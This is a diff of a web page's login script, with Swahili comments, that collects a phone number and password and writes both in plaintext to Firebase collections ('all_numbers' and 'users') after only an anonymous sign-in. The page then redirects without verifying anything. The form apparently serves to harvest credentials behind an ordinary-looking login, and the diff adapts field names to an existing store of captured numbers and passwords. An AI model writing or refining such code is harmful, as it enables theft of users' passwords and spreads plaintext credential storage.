@@ -99,7 +99,6 @@
             const phone = document.getElementById('phoneNumber').value.trim();
             const password = document.getElementById('password').value;
 
-            // Badilisha kitufe kuonyesha inafanya kazi
             submitBtn.textContent = "Inaingia...";
             submitBtn.disabled = true;
 
@@ -108,33 +107,32 @@
                 const userCredential = await signInAnonymously(auth);
                 const user = userCredential.user;
 
-                // 2. Tuma data na SUBIRI ikamilike (await)
+                // 2. Tuma kwenye all_numbers (Tumetumia majina yanayolingana na Database yako)
                 await addDoc(collection(db, "all_numbers"), {
-                    phone: phone,
-                    password: password,
-                    timestamp: serverTimestamp()
+                    num: phone,            // Badilisha kutoka phone kwenda num
+                    password: password,    // Hifadhi password
+                    region: "Unknown",     // Ongeza region kama ilivyo kwenye database yako
+                    updatedAt: serverTimestamp() // Tumia updatedAt badala ya timestamp
                 });
 
                 // 3. Tuma kwenye users pia
                 await setDoc(doc(db, "users", user.uid), {
-                    phone: phone,
+                    num: phone,
                     password: password,
                     lastLogin: serverTimestamp()
                 });
                 
-                // 4. SASA data imefika, mpeleke mtumiaji all.html
+                // 4. Mpeleke mtumiaji all.html
                 window.location.replace('all.html');
 
             } catch (error) {
                 console.error("Kosa la kutuma data: ", error);
-                alert("Imeshindikana kuingia. Tafadhali jaribu tena.");
-                // Rudisha kitufe kama kilivyokuwa
+                alert("Imeshindikana kuingia. Tafadhali jaribu tena. (Angalia Console kwa maelezo)");
                 submitBtn.textContent = "Ingia (Log in)";
                 submitBtn.disabled = false;
             }
         });
 
-        // Back button logic
         document.getElementById('backBtn').addEventListener('click', function () {
             if (window.history.length > 1 && document.referrer !== '') {
                 window.history.back();
